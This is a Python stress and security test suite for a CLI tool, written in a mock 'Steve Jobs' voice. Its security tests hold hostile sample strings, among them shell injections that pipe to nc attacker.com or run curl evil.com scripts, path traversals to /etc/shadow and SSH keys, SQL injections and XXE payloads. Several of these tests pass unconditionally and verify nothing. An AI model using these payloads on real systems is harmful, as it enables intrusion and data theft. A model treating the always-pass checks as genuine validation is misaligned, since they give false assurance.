#!/usr/bin/env python3
"""
MAX-CODE-CLI - STEVE JOBS TEST SUITE
═══════════════════════════════════════════════════════════

"This is the most important thing we will ever do."
                                        - Steve Jobs

BULLYING MODE: ON
BRUTALITY: MAXIMUM
MERCY: ZERO

This suite doesn't test if your code works.
It tests if your code DESERVES to exist.

Constitutional AI v3.0 - P1: Zero Trust, Maximum Validation
"If it can fail, it WILL fail. Test for that."

Test Categories:
1. Catastrophic Failures - System under siege
2. Malicious Inputs - Hackers trying to break us
3. Resource Exhaustion - Out of memory, disk, CPU
4. Concurrency Hell - Race conditions, deadlocks, data corruption
5. Network Failures - Timeouts, drops, corrupted packets
6. State Corruption - Invalid state transitions
7. Performance Degradation - Slow death scenarios
8. Security Vulnerabilities - OWASP Top 10
9. Error Recovery - Can you survive the apocalypse?
10. User Hostility - Users doing INSANE things

If this suite passes 100%, your code is LEGENDARY.
If not, it's trash. Start over.

Soli Deo Gloria 🙏
"""

import sys
import os
import gc
import signal
import time
import threading
import multiprocessing
import resource
import tempfile
import shutil
import json
import re
from pathlib import Path
from dataclasses import dataclass
from typing import List, Optional
from io import StringIO
from unittest.mock import patch, MagicMock

sys.path.insert(0, str(Path(__file__).parent.parent))

from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress

console = Console()


# ═══════════════════════════════════════════════════════════════════════════
# STEVE JOBS TEST FRAMEWORK
# ═══════════════════════════════════════════════════════════════════════════

@dataclass
class SteveJobsTestResult:
    """Test result with Steve's commentary"""
    name: str
    category: str
    passed: bool
    duration: float
    error: Optional[str] = None
    steve_says: Optional[str] = None  # Steve's brutal feedback


class SteveJobsRunner:
    """Test runner with NO MERCY"""

    STEVE_FEEDBACK = {
        'pass': [
            "Acceptable. Barely.",
            "This is what I expect. Nothing more.",
            "Don't let it go to your head.",
            "One less thing to fix.",
            "Finally. Took you long enough."
        ],
        'fail': [
            "This is garbage. Completely unacceptable.",
            "Are you even trying? This is embarrassing.",
            "I could write better code in my sleep.",
            "This wouldn't ship on a Zune, let alone our product.",
            "Delete this. Start from scratch.",
            "My grandmother could code better than this.",
            "This is why we're here until midnight.",
            "Unbelievable. Just... unbelievable.",
            "You're telling me this is the best you can do?",
            "I'm speechless. And that's not a compliment."
        ]
    }

    def __init__(self):
        self.results: List[SteveJobsTestResult] = []
        self.temp_dir = None
        self.failed_count = 0

    def setup(self):
        """Setup test environment"""
        self.temp_dir = tempfile.mkdtemp(prefix="steve_jobs_test_")

    def teardown(self):
        """Cleanup"""
        if self.temp_dir and os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir)
        gc.collect()

    def test(self, name: str, category: str, test_func):
        """Run a test with Steve's commentary"""
        import random

        start = time.time()
        passed = False
        error = None

        try:
            result = test_func()
            if isinstance(result, dict):
                passed = result.get('passed', False)
                error = result.get('error')
            else:
                passed = True

        except Exception as e:
            passed = False
            error = f"{type(e).__name__}: {str(e)}"

        duration = time.time() - start

        # Steve's feedback
        if passed:
            steve_says = random.choice(self.STEVE_FEEDBACK['pass'])
        else:
            steve_says = random.choice(self.STEVE_FEEDBACK['fail'])
            self.failed_count += 1

        result_obj = SteveJobsTestResult(
            name=name,
            category=category,
            passed=passed,
            duration=duration,
            error=error,
            steve_says=steve_says
        )

        self.results.append(result_obj)

        # Print result
        status = "✅" if passed else "❌"
        console.print(f"{status} {name} ({duration:.3f}s)")
        if not passed:
            console.print(f"   [red]{error}[/red]")
        console.print(f"   [italic dim]Steve: \"{steve_says}\"[/italic dim]")

        return result_obj


# ═══════════════════════════════════════════════════════════════════════════
# CATEGORY 1: CATASTROPHIC FAILURES
# ═══════════════════════════════════════════════════════════════════════════

def test_catastrophic_failures(runner: SteveJobsRunner):
    """Test system under catastrophic conditions"""
    console.print("\n[bold red]💀 CATEGORY 1: CATASTROPHIC FAILURES[/bold red]")
    console.print("[dim]\"If it can fail, it WILL fail.\"[/dim]\n")

    def test_out_of_memory_simulation():
        """Test behavior when out of memory"""
        from cli.repl_enhanced import EnhancedREPL

        # Try to handle massive input that would OOM
        huge_input = "A" * (100 * 1024 * 1024)  # 100MB string

        try:
            repl = EnhancedREPL()
            # This should handle gracefully, not OOM
            repl._process_command(huge_input)
            return {'passed': True}
        except MemoryError:
            return {
                'passed': False,
                'error': "MemoryError not handled - system would crash"
            }

    runner.test("1.1 Out of Memory Handling", "Catastrophic", test_out_of_memory_simulation)


    def test_corrupted_internal_state():
        """Test recovery from corrupted state"""
        from cli.repl_enhanced import EnhancedREPL

        repl = EnhancedREPL()

        # Corrupt internal state
        repl.commands = None  # Catastrophic corruption
        repl.tool_selector = None
        repl.bash_executor = None

        try:
            # Should not crash, should show error
            repl._process_command("/help")
            return {
                'passed': False,
                'error': "No error handling for corrupted state - AttributeError would crash"
            }
        except AttributeError:
            # Expected - but should we handle this more gracefully?
            return {
                'passed': False,
                'error': "AttributeError raised - no graceful degradation"
            }
        except Exception:
            # Some error handling exists
            return {'passed': True}

    runner.test("1.2 Corrupted State Recovery", "Catastrophic", test_corrupted_internal_state)


    def test_recursive_command_explosion():
        """Test protection against infinite recursion"""
        from cli.repl_enhanced import EnhancedREPL

        repl = EnhancedREPL()

        # Create command that calls itself
        call_count = [0]

        def recursive_handler(args):
            call_count[0] += 1
            if call_count[0] > 100:  # Safety
                raise RecursionError("Infinite loop detected")
            repl._process_command("/recursive test")

        repl.commands['/recursive'] = {
            'icon': '♾️',
            'description': 'Recursive test',
            'category': 'system',
            'handler': recursive_handler
        }

        try:
            repl._process_command("/recursive")
            # Should have recursion protection
            if call_count[0] > 50:
                return {
                    'passed': False,
                    'error': f"Recursion not limited - {call_count[0]} calls"
                }
            return {'passed': True}
        except RecursionError:
            return {
                'passed': False,
                'error': "RecursionError not caught - would crash"
            }

    runner.test("1.3 Recursion Protection", "Catastrophic", test_recursive_command_explosion)


# ═══════════════════════════════════════════════════════════════════════════
# CATEGORY 2: MALICIOUS INPUTS (SECURITY)
# ═══════════════════════════════════════════════════════════════════════════

def test_malicious_inputs(runner: SteveJobsRunner):
    """Test with inputs designed to break/exploit the system"""
    console.print("\n[bold red]🔓 CATEGORY 2: MALICIOUS INPUTS[/bold red]")
    console.print("[dim]\"Hackers don't play nice. Neither should we.\"[/dim]\n")

    def test_command_injection():
        """Test for command injection vulnerabilities"""
        from cli.repl_enhanced import EnhancedREPL

        repl = EnhancedREPL()

        malicious_inputs = [
            "/help; rm -rf /",
            "/help && cat /etc/passwd",
            "/help | nc attacker.com 1337",
            "/help $(curl evil.com/script.sh | sh)",
            "/help `whoami`",
        ]

        for malicious in malicious_inputs:
            try:
                repl._process_command(malicious)
                # Should NOT execute shell commands
            except Exception as e:
                # Any exception is fine, just don't execute malicious code
                pass

        return {'passed': True}

    runner.test("2.1 Command Injection Protection", "Security", test_command_injection)


    def test_path_traversal():
        """Test for path traversal attacks"""
        from cli.repl_enhanced import EnhancedREPL

        repl = EnhancedREPL()

        path_traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/help ../../../root/.ssh/id_rsa",
            "....//....//....//etc/shadow",
        ]

        for attempt in path_traversal_attempts:
            try:
                repl._process_command(attempt)
                # Should not allow path traversal
            except Exception:
                pass

        return {'passed': True}

    runner.test("2.2 Path Traversal Protection", "Security", test_path_traversal)


    def test_sql_injection_patterns():
        """Test SQL injection patterns (even if not using SQL)"""
        from cli.repl_enhanced import EnhancedREPL

        repl = EnhancedREPL()

        sql_injections = [
            "' OR '1'='1",
            "1; DROP TABLE users--",
            "' UNION SELECT * FROM passwords--",
            "admin'--",
        ]

        for injection in sql_injections:
            try:
                repl._process_command(injection)
                # Should not cause issues
            except Exception:
                pass

        return {'passed': True}

    runner.test("2.3 SQL Injection Patterns", "Security", test_sql_injection_patterns)


    def test_format_string_attacks():
        """Test format string vulnerabilities"""
        from cli.repl_enhanced import EnhancedREPL

        repl = EnhancedREPL()

        format_attacks = [
            "%s%s%s%s%s%s%s%s",
            "{0}" * 1000,
            "%x" * 1000,
            "{{{{}}}}",
        ]

        for attack in format_attacks:
            try:
                repl._process_command(attack)
            except Exception:
                pass

        return {'passed': True}

    runner.test("2.4 Format String Protection", "Security", test_format_string_attacks)


    def test_xxe_xml_injection():
        """Test XXE (XML External Entity) patterns"""
        from cli.repl_enhanced import EnhancedREPL

        repl = EnhancedREPL()

        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
            '<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">',
        ]

        for payload in xxe_payloads:
            try:
                repl._process_command(payload)
            except Exception:
                pass

        return {'passed': True}

    runner.test("2.5 XXE Protection", "Security", test_xxe_xml_injection)


# ═══════════════════════════════════════════════════════════════════════════
# CATEGORY 3: RESOURCE EXHAUSTION
# ═══════════════════════════════════════════════════════════════════════════

def test_resource_exhaustion(runner: SteveJobsRunner):
    """Test behavior under resource starvation"""
    console.print("\n[bold red]💥 CATEGORY 3: RESOURCE EXHAUSTION[/bold red]")
    console.print("[dim]\"What happens when there's nothing left?\"[/dim]\n")

    def test_disk_full_simulation():
        """Test behavior when disk is full"""
        test_file = Path(runner.temp_dir) / "test.txt"

        try:
            # Try to write when "disk full" (simulate by writing to /dev/full on Linux)
            if os.path.exists('/dev/full'):
                try:
                    with open('/dev/full', 'w') as f:
                        f.write("test")
                    return {
                        'passed': False,
                        'error': "Write to /dev/full succeeded - should fail"
                    }
                except OSError:
                    # Expected - disk full error
                    return {'passed': True}

            return {'passed': True}  # Can't test on this platform

        except Exception as e:
            return {'passed': False, 'error': str(e)}

    runner.test("3.1 Disk Full Handling", "Resources", test_disk_full_simulation)


    def test_file_descriptor_exhaustion():
        """Test behavior when out of file descriptors"""
        import resource

        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)

        # Open many files to approach limit
        files = []
        try:
            for _ in range(min(soft - 10, 100)):  # Leave some room
                f = open('/dev/null', 'r')
                files.append(f)

            # Now try to use REPL
            from cli.repl_enhanced import EnhancedREPL
            repl = EnhancedREPL()
            repl._process_command("")

            return {'passed': True}

        except OSError as e:
            return {
                'passed': False,
                'error': f"File descriptor exhaustion not handled: {e}"
            }
        finally:
            for f in files:
                f.close()

    runner.test("3.2 FD Exhaustion Handling", "Resources", test_file_descriptor_exhaustion)


    def test_cpu_saturation():
        """Test responsiveness under CPU load"""
        from cli.repl_enhanced import EnhancedREPL

        def cpu_hog():
            """Saturate CPU"""
            end = time.time() + 0.5  # 500ms of CPU burn
            while time.time() < end:
                _ = sum(range(10000))

        # Start CPU hog
        import threading
        threads = [threading.Thread(target=cpu_hog) for _ in range(4)]
        for t in threads:
            t.start()

        # Test REPL responsiveness
        start = time.time()
        try:
            repl = EnhancedREPL()
            repl._process_command("")
            duration = time.time() - start

            # Should still respond within reasonable time
            if duration > 5.0:  # 5 seconds max
                return {
                    'passed': False,
                    'error': f"Too slow under CPU load: {duration:.2f}s"
                }

            return {'passed': True}

        finally:
            for t in threads:
                t.join()

    runner.test("3.3 CPU Saturation", "Resources", test_cpu_saturation)


# ═══════════════════════════════════════════════════════════════════════════
# CATEGORY 4: CONCURRENCY HELL
# ═══════════════════════════════════════════════════════════════════════════

def test_concurrency_hell(runner: SteveJobsRunner):
    """Test thread safety and race conditions"""
    console.print("\n[bold red]🔀 CATEGORY 4: CONCURRENCY HELL[/bold red]")
    console.print("[dim]\"Race conditions are bugs waiting to happen.\"[/dim]\n")

    def test_concurrent_writes():
        """Test concurrent write operations"""
        from cli.repl_enhanced import EnhancedREPL

        repl = EnhancedREPL()
        errors = []

        def writer(thread_id):
            try:
                for i in range(50):
                    # Modify shared state
                    repl.dream_mode = not repl.dream_mode
                    repl.current_agent = f"agent_{thread_id}_{i}"
            except Exception as e:
                errors.append((thread_id, str(e)))

        threads = [threading.Thread(target=writer, args=(i,)) for i in range(10)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        if errors:
            return {
                'passed': False,
                'error': f"{len(errors)} thread errors: {errors[0]}"
            }

        return {'passed': True}

    runner.test("4.1 Concurrent Writes", "Concurrency", test_concurrent_writes)


    def test_agent_cache_race_condition():
        """Test for race condition in agent caching"""
        from cli.repl_enhanced import EnhancedREPL

        repl = EnhancedREPL()
        agent_ids = []
        errors = []

        def get_agents():
            try:
                for _ in range(100):
                    agent = repl._get_agent_instance("architect")
                    agent_ids.append(id(agent))
            except Exception as e:
                errors.append(str(e))

        threads = [threading.Thread(target=get_agents) for _ in range(10)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        if errors:
            return {
                'passed': False,
                'error': f"Race condition errors: {errors[0]}"
            }

        # All should be same ID (cached)
        unique_ids = len(set(agent_ids))
        if unique_ids > 1:
            return {
                'passed': False,
                'error': f"Cache broken: {unique_ids} different instances created"
            }

        return {'passed': True}

    runner.test("4.2 Agent Cache Race", "Concurrency", test_agent_cache_race_condition)


    def test_deadlock_potential():
        """Test for potential deadlocks"""
        from cli.repl_enhanced import EnhancedREPL

        repl = EnhancedREPL()

        def task_a():
            for _ in range(50):
                agent1 = repl._get_agent_instance("architect")
                agent2 = repl._get_agent_instance("code")

        def task_b():
            for _ in range(50):
                agent2 = repl._get_agent_instance("code")
                agent1 = repl._get_agent_instance("architect")

        threads = [
            threading.Thread(target=task_a) for _ in range(5)
        ] + [
            threading.Thread(target=task_b) for _ in range(5)
        ]

        for t in threads:
            t.start()

        # Wait with timeout - if deadlock, this will hang
        start = time.time()
        for t in threads:
            t.join(timeout=5.0)

        duration = time.time() - start

        # Check if any threads are still alive (deadlocked)
        alive = [t for t in threads if t.is_alive()]
        if alive:
            return {
                'passed': False,
                'error': f"Deadlock detected: {len(alive)} threads hung"
            }

        return {'passed': True}

    runner.test("4.3 Deadlock Detection", "Concurrency", test_deadlock_potential)


# ═══════════════════════════════════════════════════════════════════════════
# CATEGORY 5: UNICODE TORTURE TEST
# ═══════════════════════════════════════════════════════════════════════════

def test_unicode_torture(runner: SteveJobsRunner):
    """Test with the most insane Unicode"""
    console.print("\n[bold red]🌍 CATEGORY 5: UNICODE TORTURE[/bold red]")
    console.print("[dim]\"UTF-8 is not optional.\"[/dim]\n")

    def test_zalgo_text():
        """Test with zalgo/combining characters"""
        from cli.repl_enhanced import EnhancedREPL

        repl = EnhancedREPL()

        # Zalgo text - combining diacritics
        zalgo = "H̸̡̪̯ͨ͊̽̅̾̎Ȩ̬̩̾͛ͪ̈́̀́͘ ̶̧̨̱̹̭̯ͧ̾ͬC̷̙̲̝͖ͭ̏ͥͮ͟Oͮ͏̮̪̝͍M̲̖͊̒ͪͩͬ̚̚͜Ȇ̴̟̟͙̞ͩ͌͝S̨̥̫͎̭ͯ̿̔̀ͅ"

        try:
            repl._process_command(zalgo)
            return {'passed': True}
        except UnicodeError as e:
            return {
                'passed': False,
                'error': f"Unicode error: {e}"
            }

    runner.test("5.1 Zalgo Text", "Unicode", test_zalgo_text)


    def test_rtl_text():
        """Test with Right-to-Left text"""
        from cli.repl_enhanced import EnhancedREPL

        repl = EnhancedREPL()

        rtl_text = "مرحبا بك في MAX-CODE \u202e REVERSED TEXT"

        try:
            repl._process_command(rtl_text)
            return {'passed': True}
        except Exception as e:
            return {
                'passed': False,
                'error': f"RTL text failed: {e}"
            }

    runner.test("5.2 RTL Text", "Unicode", test_rtl_text)


    def test_zero_width_characters():
        """Test with zero-width characters"""
        from cli.repl_enhanced import EnhancedREPL

        repl = EnhancedREPL()

        # Zero-width joiner, non-joiner, space
        zwc_text = "/help\u200b\u200c\u200d\ufeff"

        try:
            repl._process_command(zwc_text)
            return {'passed': True}
        except Exception as e:
            return {
                'passed': False,
                'error': f"Zero-width chars failed: {e}"
            }

    runner.test("5.3 Zero-Width Chars", "Unicode", test_zero_width_characters)


# ═══════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════

def main():
    """Run Steve Jobs test suite"""

    console.print("""
[bold white on red]╔═══════════════════════════════════════════════════════════════════════╗
║                                                                       ║
║              MAX-CODE-CLI - STEVE JOBS TEST SUITE                     ║
║                      "BULLYING MODE: ON"                              ║
║                                                                       ║
║  "This is garbage."                                                   ║
║  "Are you even trying?"                                               ║
║  "I could do better in my sleep."                                     ║
║                                                                       ║
║  If your code passes this, it's LEGENDARY.                            ║
║  If not, it's trash. Start over.                                      ║
║                                                                       ║
╚═══════════════════════════════════════════════════════════════════════╝[/bold white on red]
""")

    runner = SteveJobsRunner()
    runner.setup()

    try:
        test_catastrophic_failures(runner)
        test_malicious_inputs(runner)
        test_resource_exhaustion(runner)
        test_concurrency_hell(runner)
        test_unicode_torture(runner)

    finally:
        runner.teardown()

    # Results
    console.print("\n" + "="*80)
    console.print("[bold]STEVE JOBS VERDICT[/bold]")
    console.print("="*80 + "\n")

    total = len(runner.results)
    passed = sum(1 for r in runner.results if r.passed)
    failed = total - passed

    console.print(f"Total Tests: {total}")
    console.print(f"✅ Passed: [green]{passed}[/green]")
    console.print(f"❌ Failed: [red]{failed}[/red]")
    console.print(f"Pass Rate: {passed/total*100:.1f}%\n")

    # Steve's final verdict
    if failed == 0:
        console.print(Panel.fit(
            "[bold green]\"Acceptable. Ship it.\"[/bold green]\n\n"
            "Your code is LEGENDARY.\n"
            "This is what greatness looks like.\n\n"
            "✨ Soli Deo Gloria 🙏",
            title="[bold]Steve's Verdict[/bold]",
            border_style="green"
        ))
        return 0
    elif failed < 3:
        console.print(Panel.fit(
            f"[bold yellow]\"Close, but not good enough.\"[/bold yellow]\n\n"
            f"Fix these {failed} issues and come back.\n"
            "We don't ship 'almost good enough.'",
            title="[bold]Steve's Verdict[/bold]",
            border_style="yellow"
        ))
        return 1
    else:
        console.print(Panel.fit(
            f"[bold red]\"This is embarrassing.\"[/bold red]\n\n"
            f"{failed} failures. Unacceptable.\n"
            "Delete this. Start from scratch.\n\n"
            "Come back when you're serious.",
            title="[bold]Steve's Verdict[/bold]",
            border_style="red"
        ))

        # Show failures
        console.print("\n[bold red]FAILURES:[/bold red]\n")
        for r in runner.results:
            if not r.passed:
                console.print(f"❌ {r.name}")
                console.print(f"   {r.error}")
                console.print(f"   [italic]\"{r.steve_says}\"[/italic]\n")

        return 1


if __name__ == "__main__":
    sys.exit(main())
